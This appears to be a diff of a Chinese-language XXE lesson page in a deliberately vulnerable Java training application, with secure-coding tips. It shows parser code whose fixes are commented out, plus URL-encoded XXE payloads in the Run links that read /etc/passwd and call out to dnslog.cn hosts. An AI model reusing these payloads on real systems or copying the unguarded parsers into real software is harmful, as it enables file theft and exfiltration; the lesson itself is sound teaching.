@@ -11,55 +11,69 @@
         <!-- 侧边栏 -->
         <div th:replace="~{commons/commons::siderbar(active='xxe.html')}"></div>
 
-        <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
-            <div class="vul_header">
-                <span>XML外部实体注入</span>
-            </div>
-            <hr>
-
-            <ul class="nav nav-tabs">
-                <li class="nav-item">
-                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span>
-                        漏洞描述</a>
-                </li>
-                <li class="nav-item">
-                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
-                </li>
-            </ul>
-
-            <div class="tab-content">
-                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
-                    XXE (XML External Entity Injection),
-                    XML外部实体注入，当开发人员配置其XML解析功能允许外部实体引用时，攻击者可利用这一可引发安全问题的配置方式，实施任意文件读取、内网端口探测、命令执行、拒绝服务等攻击。
+        <main role="main" class="col-md-10 offset-md-2 pt-3 main">
+            <div class="card">
+                <div class="card-header py-1">
+                    <div class="vul_header">
+                        <span>XML外部实体注入</span>
+                        <span class="header_link">
+                            <a class="btn btn-sm btn-primary" target="_blank"
+                               href="#">漏洞案例</a>
+                            <a class="btn btn-sm btn-primary" target="_blank"
+                               href="#">wiki</a>
+                        </span>
+                    </div>
                 </div>
-                <div class="tab-pane fade" id="bb">
-                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder"
-                              style="height: 180px;">
-【必须】XML解析器关闭DTD解析
- 读取外部传入XML文件时，XML解析器初始化过程中设置关闭DTD解析。
- 参考示例:
- xxx.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-                    </textarea>
+
+                <div class="card-body">
+                    <ul class="nav nav-tabs">
+                        <li class="nav-item">
+                            <a class="nav-link active" data-toggle="tab" href="#vulDescription">
+                                漏洞描述</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" data-toggle="tab" href="#secureCoding"> 安全编码</a>
+                        </li>
+                    </ul>
+
+                    <div class="tab-content">
+                        <div class="tab-pane active" id="vulDescription">
+                            <div class="alert alert-desc"><i class="lnr lnr-alarm"></i>
+                                XXE (XML External Entity Injection),
+                                XML外部实体注入，当开发人员配置其XML解析功能允许外部实体引用时，攻击者可利用这一可引发安全问题的配置方式，实施任意文件读取、内网端口探测、命令执行、拒绝服务等攻击。
+                            </div>
+                        </div>
+                        <div class="tab-pane fade" id="secureCoding">
+                            <div class="alert alert-desc">
+                                <li>【必须】XML解析器关闭DTD解析</li>
+                                读取外部传入XML文件时，XML解析器初始化过程中设置关闭DTD解析。<br>
+                                参考示例:<br>
+                                xxx.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);<br>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
-
-            <hr>
 
             <div class="box-float">
                 <div class="float1">
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       th:href="@{/XXE/XMLReader?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%36%31%67%6b%62%38%2e%64%6e%73%6c%6f%67%2e%63%6e%22%3e%5d%3e%3c%72%6f%6f%74%3e%26%78%78%65%3b%3c%2f%72%6f%6f%74%3e}">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                       th:href="@{/vulnapi/XXE/XMLReader?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%36%31%67%6b%62%38%2e%64%6e%73%6c%6f%67%2e%63%6e%22%3e%5d%3e%3c%72%6f%6f%74%3e%26%78%78%65%3b%3c%2f%72%6f%6f%74%3e}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - XMLReader</span></h5>
-                    <label for="code1"></label><textarea class="form-control" id="code1">
+                    <textarea class="form-control" id="code1">
+/**
+ * 产生原因：在未禁用外部实体解析的情况下，XML解析器可能会处理外部实体声明，从而导致XXE
+ */
 public String XMLReader(@RequestBody String content) {
     try {
         XMLReader xmlReader = XMLReaderFactory.createXMLReader();
-        // 修复：禁用外部实体
+
+        // 修复：禁用外部实体解析
         // xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
         xmlReader.parse(new InputSource(new StringReader(content)));
         return "XMLReader XXE";
@@ -70,34 +84,44 @@ public String XMLReader(@RequestBody String content) {
                     </textarea><br><br>
 
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       th:href="@{/XXE/SAXReader?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%30%67%35%7a%76%64%2e%64%6e%73%6c%6f%67%2e%63%6e%22%3e%5d%3e%3c%72%6f%6f%74%3e%26%78%78%65%3b%3c%2f%72%6f%6f%74%3e}">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                       th:href="@{/vulnapi/XXE/SAXReader?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%30%67%35%7a%76%64%2e%64%6e%73%6c%6f%67%2e%63%6e%22%3e%5d%3e%3c%72%6f%6f%74%3e%26%78%78%65%3b%3c%2f%72%6f%6f%74%3e}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - SAXReader</span></h5>
                     <textarea class="form-control" id="code2">
-SAXReader sax = new SAXReader();
-// 修复：禁用外部实体
-// sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-sax.read(new InputSource(new StringReader(content)));
+@RequestMapping(value = "/SAXReader")
+public String SAXReader(@RequestParam String content) {
+    try {
+        SAXReader sax = new SAXReader();
+
+        // 修复：禁用外部实体
+        // sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+        sax.read(new InputSource(new StringReader(content)));
+        return "SAXReader XXE";
+    } catch (Exception e) {
+        return e.toString();
+    }
+}
                     </textarea><label for="code2"> </label> <br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       th:href="@{/XXE/SAXBuilder}">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank" onclick="submitSAXBuilder()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - SAXBuilder</span></h5>
-                    <label for="code3"></label><textarea class="form-control" id="code3">
+                    <textarea class="form-control" id="code3">
 @RequestMapping(value = "/SAXBuilder")
 public String SAXBuilder(@RequestBody String content) {
     try {
         SAXBuilder saxbuilder = new SAXBuilder();
-        // 修复: saxbuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+        // 修复：禁用外部实体
+        // saxbuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
         saxbuilder.build(new InputSource(new StringReader(content)));
         return "SAXBuilder XXE";
     } catch (Exception e) {
@@ -110,40 +134,43 @@ public String SAXBuilder(@RequestBody String content) {
 
                 <div class="float2">
                     <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       th:href="@{/XXE/DocumentBuilder?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%3e%5d%3e%3c%70%65%72%73%6f%6e%3e%3c%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6e%61%6d%65%3e%3c%2f%70%65%72%73%6f%6e%3e}">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                       th:href="@{/vulnapi/XXE/DocumentBuilder?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%3e%5d%3e%3c%70%65%72%73%6f%6e%3e%3c%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6e%61%6d%65%3e%3c%2f%70%65%72%73%6f%6e%3e}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - DocumentBuilder</span></h5>
-                    <label for="code4"></label><textarea class="form-control" id="code4">
-DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
-// 修复: 禁用外部实体
-// factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-DocumentBuilder builder = factory.newDocumentBuilder();
+                    <textarea class="form-control" id="code4">
+@RequestMapping(value = "/DocumentBuilder")
+public String DocumentBuilder(@RequestParam String content) {
+    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+
+    // 修复: 禁用外部实体
+    // factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+    DocumentBuilder builder = factory.newDocumentBuilder();
+}
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
-                       th:href="@{/XXE/unmarshaller}">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                    <a style="float:right" class="btn btn-sm btn-danger" onclick="submitUnmarshaller()">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - Unmarshaller</span></h5>
-                    <label for="code5"></label><textarea class="form-control" id="code5">
+                    <textarea class="form-control" id="code5">
 /**
-  *  PoC
-  * Content-Type: application/xml
-  * <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/hosts">]><student><name>&out;</name></student>
-  */
+ * Payload:
+ * <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/hosts">]><student><name>&out;</name></student>
+ */
 public String Unmarshaller(@RequestBody String content) {
     try {
         JAXBContext context = JAXBContext.newInstance(Student.class);
         Unmarshaller unmarshaller = context.createUnmarshaller();
 
         XMLInputFactory xif = XMLInputFactory.newFactory();
+
         // 修复: 禁用外部实体
         // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
         // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
@@ -152,7 +179,6 @@ public String Unmarshaller(@RequestBody String content) {
 
         Object o = unmarshaller.unmarshal(xsr);
         return o.toString();
-
 } catch (Exception e) {
     e.printStackTrace();
 }
@@ -160,14 +186,14 @@ public String Unmarshaller(@RequestBody String content) {
                     </textarea><br><br>
 
                     <a style="float:right" class="btn btn-sm btn-success" target="_blank"
-                       th:href="@{/XXE/safe?content=%3c!ENTITY}">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                       th:href="@{/vulnapi/XXE/safe?content=%3c!ENTITY}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
                             <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
                         </svg>
                         <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-smile"> 安全代码 - 黑名单过滤</span></h5>
-                    <label for="code6"></label><textarea class="form-control" id="code6">
+                    <textarea class="form-control" id="code6">
 public static boolean checkXXE(String content) {
     String[] black_list = {"ENTITY", "DOCTYPE"};
     for (String s : black_list) {
@@ -187,6 +213,38 @@ public static boolean checkXXE(String content) {
 
 <!-- 引入script -->
 <div th:replace="~{commons/commons::script}"></div>
+
+<script>
+    function submitUnmarshaller() {
+        $.ajax({
+            url: '/vulnapi/XXE/unmarshaller',
+            type: 'POST',
+            contentType: 'application/xml',
+            data: `<?xml version="1.0" encoding="utf-8"?><student><name>xiaoming</name></student>`,
+            success: function(response) {
+                alert(response);
+            },
+            error: function(jqXHR, textStatus, errorThrown) {
+                console.error('请求失败:', textStatus, errorThrown);
+            }
+        });
+    }
+
+    function submitSAXBuilder() {
+        $.ajax({
+            url: '/vulnapi/XXE/SAXBuilder',
+            type: 'POST',
+            contentType: 'application/xml',
+            data: `<?xml version="1.0" encoding="utf-8"?><root>1</root>`,
+            success: function(response) {
+                alert(response);
+            },
+            error: function(jqXHR, textStatus, errorThrown) {
+                console.error('请求失败:', textStatus, errorThrown);
+            }
+        });
+    }
+</script>
 
 
 </body>
